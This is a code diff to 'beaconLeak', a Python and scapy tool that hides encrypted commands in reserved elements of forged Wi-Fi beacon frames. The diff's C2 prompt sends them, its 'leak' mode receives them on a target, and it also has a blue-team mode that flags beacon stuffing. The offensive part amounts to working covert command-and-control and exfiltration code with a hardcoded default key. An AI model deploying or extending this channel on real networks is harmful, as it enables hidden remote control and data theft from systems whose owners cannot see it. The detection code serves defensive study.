@@ -5,7 +5,7 @@
 | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
 | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
 |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                           by cjcase [v0.7]
+                           by cjcase [v0.8]
 
 beaconLeak - Covert data exfiltration and detection using beacon stuffing (🥓)
 """
@@ -28,19 +28,26 @@ from scapy.all import hexdump
 
 
 class beaconleak():
-    def __init__(self, mode, iface, **kwargs):
+    def __init__(self, mode, iface, psk=None, **kwargs):
+        # mode selection
         self.mode = mode
-        self.iface = iface
+        # sniffing interface
+        self.iface = iface        
+        # used by covert
         self.beacons = {}
         # hardcoded passwords are no fun
-        self.key = bytes.fromhex(
-            '299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8'
-        )
-        self.box = nacl.secret.SecretBox(self.key)
-        self.debug = kwargs.get('debug')
+        if not psk:
+            self.psk = bytes.fromhex('299e29a4d36990bc479d6fed6551a94c7e3da6e10c8cdf9bab9e3c18a04ddee8')
+        else:
+            self.psk = psk.encode('utf-8')
+        # crypto
+        self.box = nacl.secret.SecretBox(self.psk)
         # IEEE Std 802.11™-2016. Table 9-77, Element IDs. p.784-790
         self.reserved = [2, 8, 9] + [*range(17,32)] + [47, 49, 128, 129] + [*range(133, 137)] + [149, 150, 155, 156, 173, 176] + [*range(178, 181)] + [203] + [*range(207,221)] + [*range(222, 255)]
+        # science
         self.detected = 0
+        self.debug = kwargs.get('debug')
+        # TODO: implement ssid/bssid from arguments (class)
 
     def cmd(self, cmd):
         args = shlex.split(cmd)
@@ -52,17 +59,22 @@ class beaconleak():
         print("[*] Using interface %s, use Ctrl+C to exit" % iface)
         while True:
             try:
-                cmd = input("[beaconshell] # ") 
+                # TODO: nice-to-have: color output to terminal (interoperable)
+                cmd = input("[beaconshell] >> ") 
             except KeyboardInterrupt:
                 print("\n[*] Done!")
                 break
             except Exception as e:
                 print("[e] Something failed: " + str(e))
                 continue
+            # TODO: implement interactive commands for extra c2 functions
+            # TODO: implement leak mode with extra measurements
             msg = cmd.encode()
             msg_e = self.box.encrypt(msg)
             if self.debug:
                 print("[d] encrypted: {}".format(msg_e.hex()))
+            # TODO: implement ssid/bssid from arguments (leak mode)
+            # TODO: implement ssid/bssid from covert packet (tie in with args)
             ssid = 'linksys'
             bssid = '00:14:bf:de:ad:c0'
             rates = b'\x82\x84\x0b\x16'
@@ -86,6 +98,7 @@ class beaconleak():
             #    cap='ESS+privacy',
             #    timestamp=int(time.time())
             #)
+            # TODO: maybe use a packet building method
             beacon = Dot11Beacon(cap='ESS+privacy')
             _ssid = Dot11Elt(ID='SSID', info=ssid, len=len(ssid))
             _rsninfo = Dot11Elt(ID='RSNinfo', info=rsninfo, len=len(rsninfo))
@@ -93,6 +106,7 @@ class beaconleak():
             _type = Dot11Elt(ID=253, info='\x01', len=1)
             _stuff = Dot11Elt(ID=254, info=msg_e, len=len(msg_e))
             frame = RadioTap() / dot11 / beacon / _ssid / _rates / _rsninfo / _type / _stuff
+            # TODO: optional bpf filtering
             # bpf = 'wlan addr2 %s' % bssid
 
             if self.debug:
@@ -120,6 +134,7 @@ class beaconleak():
 
     def magic(self, packet):
         if packet.haslayer(Dot11Elt):
+            # TODO: redo target logic using new implemented detection method
             if packet.addr2 == '00:14:bf:de:ad:c0' and packet[Dot11Elt][3].ID == 253:
                 crypted = packet[Dot11Elt][4].info
                 if self.debug:
@@ -157,7 +172,7 @@ class beaconleak():
     def sniff(self, pcap=False):
         iface = self.iface
         try:
-            if self.mode == "sniff":
+            if self.mode == "leak":
                 sniff(iface=iface, prn=self.magic)
             elif self.mode == "mon":
                 if pcap:
@@ -200,16 +215,19 @@ class beaconleak():
         print("\t[i] using {}({} dBm)".format(str(packet.info), check))
         if self.debug:
             print("[d] packet:\n{}".format(packet.command()))
+        # TODO: should we really return or take a more OOP approach?
         return packet
 
     # this is for the blue teamers
     def detect(self, packet):
-        if packet.haslayer(Dot11Elt):
+        if packet.haslayer(Dot11Beacon):
             elements = packet.getlayer(Dot11Elt)
             #if self.debug:
             #    print(packet.command())
             while elements:
                 if elements.ID in self.reserved:
+                    # some beacon stuffing was found in the wild for elemnt 47, investigate further
+                    # TODO: implement syslog functionality for IoCs
                     print("[!] BEACON STUFFING DETECTED (SSID:{} Reserved Element {})".format(packet[Dot11Beacon].info.decode('utf-8'), elements.ID))
                     self.detected += 1
                     if self.debug:
@@ -223,17 +241,16 @@ if __name__ == '__main__':
     | |_ ___ ___ ___ ___ ___|  |   ___ ___| |_
     | . | -_| .'|  _| . |   |  |__| -_| .'| '_|
     |___|___|__,|___|___|_|_|_____|___|__,|_,_|
-                               by cjcase [v0.7]\n
+                               by cjcase [v0.8]\n
     """
     parse = argparse.ArgumentParser(add_help=True, formatter_class=argparse.RawTextHelpFormatter, description=banner)
     modes = parse.add_argument_group('modes')
     mutex = modes.add_mutually_exclusive_group(required=True)
     mutex.add_argument(
-        '--leak', # this mode is being worked on, defaults to sniff
+        '--leak', 
         help='(target) Leak data mode.',
         action='store_true'
     )
-    mutex.add_argument('--sniff', help='() Sniff incoming C2 beacons.', action='store_true')
     mutex.add_argument(
         '--mon',
         help='(detect) Check surroundings for possible attacks',
@@ -252,13 +269,13 @@ if __name__ == '__main__':
         parse.add_argument(arg, help=txt, action='store_true')
 
     # extra options
-    parse.add_argument('--ssid', help='Emulated station WiFi name')
-    parse.add_argument('--bssid', help='Emulated station MAC address')
+    parse.add_argument('--ssid', help='Emulated station WiFi name') # TODO: implement ssid/bssid from arguments
+    parse.add_argument('--bssid', help='Emulated station MAC address') # TODO: implement ssid/bssid from arguments
     parse.add_argument('--psk', help='Custom encryption passphrase')
-    parse.add_argument('--pcap', help='pcap file for offline beacon analysis')
+    parse.add_argument('--pcap', nargs='+', help='pcap file(s) for offline beacon analysis')
 
     # Logging options
-    parse.add_argument('--loglevel', help='log level, lowest is critical')
+    parse.add_argument('--loglevel', help='log level, lowest is critical') # TODO
 
     parse.add_argument('iface', help='Wireless interface in monitor mode')
     args = parse.parse_args()
@@ -266,20 +283,21 @@ if __name__ == '__main__':
     # covert mode
     packet = None
     if args.covert:
+        print(banner)
         bl = beaconleak('covert', args.iface, debug=args.debug)
-        print(banner)
-        packet = bl.covert()        
-
+        packet = bl.covert()
+    # leak mode
     if args.leak:
-        bl = beaconleak('leak', args.iface, debug=args.debug)
+        bl = beaconleak('leak', args.iface, debug=args.debug, psk=args.psk)
         bl.sniff()
-    elif args.sniff:
-        bl = beaconleak('sniff', args.iface, debug=args.debug)
-        bl.sniff()
+    # c2 mode
     elif args.c2:
-        bl = beaconleak('c2', args.iface, debug=args.debug)
         print(banner)
+        if args.psk:
+            print("[*] Using custom key, set up leaker to use it too.")
+        bl = beaconleak('c2', args.iface, debug=args.debug, psk=args.psk)
         bl.c2()
+    # detect mode
     elif args.mon:
         bl = beaconleak('mon', args.iface, debug=args.debug)
         print(banner)
